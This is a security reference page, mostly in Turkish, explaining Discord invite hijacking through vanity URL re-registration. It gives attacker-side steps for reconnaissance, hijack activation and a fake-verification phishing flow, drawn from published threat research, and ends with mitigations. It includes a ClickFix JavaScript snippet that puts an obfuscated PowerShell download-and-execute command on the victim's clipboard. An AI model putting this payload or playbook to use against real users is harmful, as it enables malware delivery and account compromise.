# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord invite hijacking, custom vanity link'lerin yeniden kullanım kurallarını kötüye kullanır: süresi dolmuş geçici bir davet kodu veya yalnızca küçük harf ve rakamlardan oluşan, silinmiş kalıcı bir kod, Level 3 Boost uygulanmış bir sunucuda vanity link olarak kaydedilebilir. Özel bir vanity link, orijinal sunucu Level 3 Boost'unu kaybettiğinde de kullanılabilir hale gelebilir; büyük harf içeren geçici bir davet için saldırgan, normal davet etkin kalırken küçük harfli vanity biçimini önceden kaydedebilir, ancak yönlendirme yalnızca bu davetin süresi dolduktan sonra başlar.<sup>[[1]](#references)[[2]](#references)</sup>

## Invite Types and Hijack Risk

Gözlemlenen risk davet türüne göre değişir:<sup>[[1]](#references)[[2]](#references)</sup>

| Invite Type           | Hijackable? | Condition / Comments                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporary Invite Link | ✅          | Süresi dolduktan sonra kod kullanılabilir hale gelir ve Boost uygulanmış bir sunucu tarafından vanity URL olarak yeniden kaydedilebilir. |
| Permanent Invite Link | ⚠️          | Silinmişse ve yalnızca küçük harfler ile rakamlardan oluşuyorsa kod yeniden kullanılabilir hale gelebilir.        |
| Custom Vanity Link    | ✅          | Orijinal sunucu Level 3 Boost'unu kaybederse vanity invite yeni kayıtlar için kullanılabilir hale gelir.    |

## Exploitation Steps

1. Reconnaissance
- `discord.gg/{code}` veya `discord.com/invite/{code}` kalıbıyla eşleşen invite link'leri için herkese açık kaynakları (forumlar, sosyal medya, Telegram kanalları) izleyin.<sup>[[1]](#references)</sup>
- İlgilenilen invite code'larını (geçici veya vanity) toplayın.<sup>[[1]](#references)</sup>
2. Pre-registration
- Level 3 Boost ayrıcalıklarına sahip yeni bir Discord server oluşturun veya mevcut bir server kullanın.<sup>[[1]](#references)[[2]](#references)</sup>
- **Server Settings → Vanity URL** bölümünde hedef invite code'unu atamayı deneyin. Kabul edilirse kod malicious server tarafından rezerve edilir.<sup>[[1]](#references)</sup>
3. Hijack Activation
- Geçici invite'lar için orijinal invite'ın süresinin dolmasını bekleyin (veya kaynağı kontrol ediyorsanız invite'ı manuel olarak silin).<sup>[[1]](#references)</sup>
- Büyük harf içeren code'lar için küçük harfli varyant hemen claim edilebilir, ancak yönlendirme yalnızca süresi dolduktan sonra etkinleşir.<sup>[[1]](#references)</sup>
4. Silent Redirection
- Eski linki ziyaret eden kullanıcılar, hijack etkinleştirildiğinde sorunsuz şekilde attacker-controlled server'a gönderilir.<sup>[[1]](#references)</sup>

## Phishing Flow via Discord Server

1. Yalnızca **#verify** kanalının görünür olması için server kanallarını kısıtlayın.<sup>[[1]](#references)</sup>
2. Yeni gelenlerden OAuth2 ile verify olmalarını istemek için bir bot (ör. **Safeguard#0786**) deploy edin.<sup>[[1]](#references)</sup>
3. Bot, CAPTCHA veya verification adımı görünümü altında kullanıcıları bir phishing sitesine (ör. `captchaguard.me`) yönlendirir.<sup>[[1]](#references)</sup>
4. **ClickFix** UX taktiğini uygulayın:<sup>[[1]](#references)</sup>
- Bozuk bir CAPTCHA mesajı görüntüleyin.
- Kullanıcıları **Win+R** iletişim kutusunu açmaya, önceden yüklenmiş bir PowerShell komutunu yapıştırmaya ve Enter'a basmaya yönlendirin.

### ClickFix Clipboard Injection Example

Campaign, malicious bir PowerShell komutunu panoya kopyalamak için JavaScript kullandı:<sup>[[1]](#references)</sup>
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Bu yaklaşım, doğrudan dosya indirmelerini önler ve kullanıcı şüphesini azaltmak için tanıdık UI öğelerinden yararlanır.<sup>[[1]](#references)</sup>

## Mitigations

- Kalıcı invite linklerini tercih edin ve kodun en az bir büyük harf içerdiğinden emin olun; büyük harf içeren silinmiş kalıcı kodlar vanity link olarak yeniden kullanılamaz.<sup>[[1]](#references)</sup>
- Invite kodlarını düzenli olarak rotate edin ve eski linkleri revoke edin.
- Discord server boost durumunu ve vanity URL taleplerini izleyin.<sup>[[1]](#references)[[2]](#references)</sup>
- Kullanıcıları server gerçekliğini doğrulamaları ve clipboard'a yapıştırılmış komutları çalıştırmaktan kaçınmaları konusunda eğitin.

## References

- [1] [Güvenden Tehdide: Multi-Stage Malware Delivery İçin Kullanılan Ele Geçirilmiş Discord Invite'ları](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Özel Invite Linki – Discord Support](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
